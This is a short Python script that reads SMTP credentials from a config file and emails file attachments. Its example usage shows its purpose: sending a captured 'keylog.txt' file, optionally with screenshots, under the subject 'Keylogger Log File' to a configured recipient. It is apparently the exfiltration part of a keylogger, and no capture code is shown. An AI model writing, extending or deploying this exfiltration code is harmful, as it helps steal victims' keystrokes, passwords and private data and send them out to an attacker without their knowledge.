import os
import smtplib
import json
import mimetypes
from email.message import EmailMessage

# === Load config from config.json ===
with open("config.json", "r") as f:
    config = json.load(f)

SENDER_EMAIL = config["sender_email"]
APP_PASSWORD = config["app_password"]
RECIPIENT_EMAIL = config["recipient_email"]
SMTP_SERVER = config["smtp_server"]
SMTP_PORT = config["smtp_port"]

def send_email(subject, body, attachment_path):
    msg = EmailMessage()
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECIPIENT_EMAIL
    msg["Subject"] = subject
    msg.set_content(body)

    # Handle single or multiple attachments
    if not isinstance(attachment_path, list):
        attachment_path = [attachment_path]

    for path in attachment_path:
        if os.path.exists(path):
            mime_type, _ = mimetypes.guess_type(path)
            mime_type = mime_type or "application/octet-stream"
            maintype, subtype = mime_type.split("/")
            with open(path, "rb") as f:
                msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=os.path.basename(path))

    with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
        server.login(SENDER_EMAIL, APP_PASSWORD)
        server.send_message(msg)
        print("✅ Email sent successfully.")

# === Example usage ===
if __name__ == "__main__":
    send_email(
        subject="Keylogger Log File",
        body="Attached is the latest keylog file.",
        attachment_path="keylog.txt"  # Can also be a list like ["keylog.txt", "screenshot.png"]
    )
